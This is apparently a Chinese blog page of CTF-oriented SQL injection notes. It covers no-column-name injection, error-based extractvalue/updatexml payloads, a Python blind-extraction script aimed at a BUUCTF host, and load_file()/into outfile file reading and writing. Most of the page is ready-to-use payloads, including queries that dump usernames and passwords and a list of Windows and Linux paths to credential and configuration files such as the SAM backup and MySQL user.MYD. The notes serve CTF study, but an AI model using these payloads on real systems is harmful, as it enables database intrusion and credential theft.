<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id = &#x27;1&#x27; union select 1,2,&#x27;a&#x27;,4,5,6,7 order by 3</span><br></pre></td></tr></table></figure>

<p>过滤了列名，过滤了括号，适用于已知该表的列名以及列名位置的注入</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>一般有个注册页面，然后还有一个修改的页面，里面按照所学知识进行注入</p>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>[BUUCTF-WEB 【GYCTF2020】Ezsqli 1 | Fan的小酒馆 (fanygit.github.io)](<a target="_blank" rel="noopener" href="https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli">https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli</a> 1/?msclkid=75a0462da7f211ecb8afadeb73123d5b)</p>
<p>当我们通过暴力破解获取到表名后，如何利用呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</span><br></pre></td></tr></table></figure>

<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p>
<p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.获取字段数，用order by 或 group by</span><br><span class="line"></span><br><span class="line">2.列名为 id、name、password  列名被替换成对应的数字</span><br><span class="line">  select 1,2,3 union select * from admin;</span><br><span class="line">  </span><br><span class="line">3.数字对应列，获取某一列的信息（末尾的 a 可以是任意字符，用于命名。）</span><br><span class="line">  select `3` from (select 1,2,3 union select * from   admin)a;</span><br><span class="line">多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</span><br><span class="line">  select b from (select 1,2,3 as b union select *     from admin)a;</span><br><span class="line"> 同时查询多个列</span><br><span class="line"> select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br><span class="line"> </span><br><span class="line">4.</span><br><span class="line">  select a,b from posts where a=-1 union select 1,   (select concat(`3`,0x2d,`4`) from (select           1,2,3,4,5,6 union select * from xxx)a limit       1,1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h3><p>可获取表名和库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</span><br><span class="line">1.111&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br><span class="line"></span><br><span class="line">2.111&#x27;/**/union/**/select/**/1,(select/**/aaa/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br><span class="line"></span><br><span class="line">3.111&#x27;/**/union/**/select/**/1,(select/**/bbb/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select table_schema from sys.schema_auto_increment_columns;　　//查数据库</span><br><span class="line"></span><br><span class="line"> select table_name from sys.schema_auto_increment_columns where table_schema = &#x27;test&#x27;;　　//查表</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h3><p>当 “in” 被过滤时，information_schema 和 mysql.innodb_table_stats 同时也被过滤了。这时可以用<strong>sys.schema_table_statistics</strong>来获取库名、表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();</span><br><span class="line"></span><br><span class="line">.利用join获取列名（join在CTF中经常使用的思路</span><br><span class="line">select * from user where id = -1 union all select * from (select * from user as a join user as b)as c;</span><br><span class="line"></span><br><span class="line">获取更多字段名和字段值</span><br><span class="line"> select * from user where id = -1 union all select*from (select * from user as a join user b using(id,username,passwd,phone))c;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="mysql-innodb-table-stats"><a href="#mysql-innodb-table-stats" class="headerlink" title="mysql.innodb_table_stats"></a>mysql.innodb_table_stats</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_statstable_schema </span><br></pre></td></tr></table></figure>

<p>当 “or” 被过滤了导致information_schema不能用时，我们可以用<strong>mysql.innodb_table_stats</strong>这个表来获取库名、表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br><span class="line">查询表名</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;查询表的内容</span><br></pre></td></tr></table></figure>



<h3 id="sys-x-schema-table-statistics"><a href="#sys-x-schema-table-statistics" class="headerlink" title="sys.x$schema_table_statistics"></a>sys.x$schema_table_statistics</h3><p>只能查到表名，查不到列名</p>
<p>显然，当 “in” 被过滤时，information_schema 和 mysql.innodb_table_stats 同时也被过滤了。这时可以用<strong>sys.schema_table_statistics</strong>来获取库名、表名</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107935479">https://blog.csdn.net/Mr_helloword/article/details/107935479</a>)</p>
<p>无列名注入（由以上步骤获得表名）</p>
<h3 id="子查询绕过"><a href="#子查询绕过" class="headerlink" title="子查询绕过"></a>子查询绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(select `2` from (select 1,2,3 union select * from table_name)a)  //前提是要知道表名</span><br><span class="line"></span><br><span class="line">((select c from (select 1,2,3 as c union select * from users)b))    1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量</span><br></pre></td></tr></table></figure>

<h3 id="join爆破列名"><a href="#join爆破列名" class="headerlink" title="join爆破列名"></a>join爆破列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union all select * from (select * from users as a join users as b)as c--+//as主要作用是起别名，就是把users表当做a表，常规来说as可以省略</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union all select*from (select * from users as a join users as b using(id,username))as c--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="逐字符检索数据"><a href="#逐字符检索数据" class="headerlink" title="逐字符检索数据"></a>逐字符检索数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://1b3daf7d-ee37-450b-878a-e928c705733c.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;-1||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">        py=payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="built_in">print</span>(py)</span><br><span class="line">        datas=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;FLAG&#123;AE26CBD7-C851-4928-98E4-E0635D45B90C&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.lower())//转化成小写</span><br></pre></td></tr></table></figure>



<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>判断注入方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1--+ 正确</span><br><span class="line"></span><br><span class="line">？id=1&#x27; and 1=2--+ 错误</span><br></pre></td></tr></table></figure>

<p>如果没有完全显示可以用not in</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;and column_n</span><br><span class="line">ame not in(&#x27;user_id&#x27;,&#x27;first_name&#x27;,&#x27;last_name&#x27;,&#x27;user&#x27;,&#x27;avatar&#x27;,&#x27;last_login&#x27;,&#x27;failed_login&#x27;))))--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password)from users)))--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password)from users where username not in (&#x27;Dumb&#x27;,&#x27;I-kill-you&#x27;,))))--+</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆数据库?username=admin&#x27;or(updatexml(1,concat(0x7e,(database()),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line">报表名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27;1&amp;password=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​爆列名?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))or&#x27;1&amp;password=1​</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">密码?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(left(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1?username=admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,32))from(H4rDsq1)),0x7e),1))or&#x27;1&amp;password=1​​</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/90812612">(43条消息) sql注入之报错注入_silence1_的博客-CSDN博客_报错注入</a></p>
<h2 id="导入导出相关操作的讲解"><a href="#导入导出相关操作的讲解" class="headerlink" title="导入导出相关操作的讲解"></a>导入导出相关操作的讲解</h2><h3 id="1、load-file-导出文件"><a href="#1、load-file-导出文件" class="headerlink" title="1、load_file()导出文件"></a>1、load_file()导出文件</h3><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p> <strong>使用条件：</strong> </p>
<p>A、必须有权限读取并且文件必须完全可读 and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。 and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权</p>
<p> B、欲读取文件必须在服务器上 </p>
<p>C、必须指定文件完整的路径</p>
<p>D、欲读取文件必须小于 max_allowed_pack</p>
<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的 就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只administrators 才能访问的文件，users 就别想 load_file 出来。 在实际的注入中，<strong>我们有两个难点需要解决：</strong> </p>
<p>绝对物理路径 </p>
<p>构造有效的畸形语句 （报错爆出绝对路径）</p>
<p>在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors = on，程序就会暴露 WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务 器的安全将受到严重的威胁。 常用路径： <a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5729087.html">http://www.cnblogs.com/lcamry/p/5729087.html</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">WINDOWS下:</span><br><span class="line">c:/boot.ini //查看系统版本</span><br><span class="line"></span><br><span class="line">c:/windows/php.ini //php配置信息</span><br><span class="line"></span><br><span class="line">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line"></span><br><span class="line">c:/winnt/php.ini</span><br><span class="line"></span><br><span class="line">c:/winnt/my.ini</span><br><span class="line"></span><br><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"></span><br><span class="line">//存储了pcAnywhere的登陆密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</span><br><span class="line"></span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</span><br><span class="line"></span><br><span class="line">c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</span><br><span class="line"></span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line"></span><br><span class="line">C:\Program Files\mysql\my.ini</span><br><span class="line"></span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line">LUNIX/UNIX 下:</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line"></span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.cnf //mysql的配置文件</span><br><span class="line"></span><br><span class="line">/etc/redhat-release //系统版本</span><br><span class="line"></span><br><span class="line">/etc/issue</span><br><span class="line"></span><br><span class="line">/etc/issue.net</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line"></span><br><span class="line">load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</span><br><span class="line"></span><br><span class="line">replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</span><br><span class="line"></span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br></pre></td></tr></table></figure>

<p>示例：Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109))) 利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。 </p>
<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码 </p>
<p>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69” </p>
<p>-1 union select 1,1,1,load_file(c:\boot.ini) Explain:路径里的/用 \代替</p>
<h3 id="2、文件导入到数据库"><a href="#2、文件导入到数据库" class="headerlink" title="2、文件导入到数据库"></a>2、文件导入到数据库</h3><p>这里需要注意的是在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1）secure_file_priv</span><br><span class="line">这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；如果这个参数为空，那么导入导出的文件位置将不受限制。</span><br><span class="line">该参数的设置，可以在my.cnf配置文件中修改，而在搭建的SQLi-Labs环境中下需要在配置的phpstudy环境中修改，具体修改方法因配置环境而异，此处不作讲解。</span><br><span class="line">（2）datadir</span><br><span class="line">这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径</span><br><span class="line">（3）PrivateTmp</span><br><span class="line">使用Systemd进程作为启动进程的linux系统，其子进程都会有一个属性叫PrivateTmp，用于设置是否使用私有的tmp目录。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ and 1=2 union select 1,@@datadir,@@secure_file_priv–+</span><br><span class="line"></span><br><span class="line">/www/mysqsl_data/mysql-5.5.62/data/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/Less-7/?id=1’))%20 and 1=2 union slect id,username,password into outfile ‘outcome.php’–+</span><br><span class="line"></span><br><span class="line">/www/mysqsl_data/mysql-5.5.62/data/security/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必 须为一个文字字符串。</p>
<p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必 须为一个文字字符串。</p>
<p>函数具体介绍：对于参数介绍这里就不过多的赘述了，可以参考 mysql 的文档。（提醒：参 考文档才是最佳的学习资料）</p>
<p>示例：load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’ lines </p>
<p>将/tmp/t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是 每一项数据之间的分隔符，lines terminated by是行的结尾符。</p>
<p>当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑 /tmp 等文件夹</p>
<p>TIPS：我们从 mysql5.7 的文档看到添加了 load xml 函数，是否依旧能够用来做注入还需要验 证。</p>
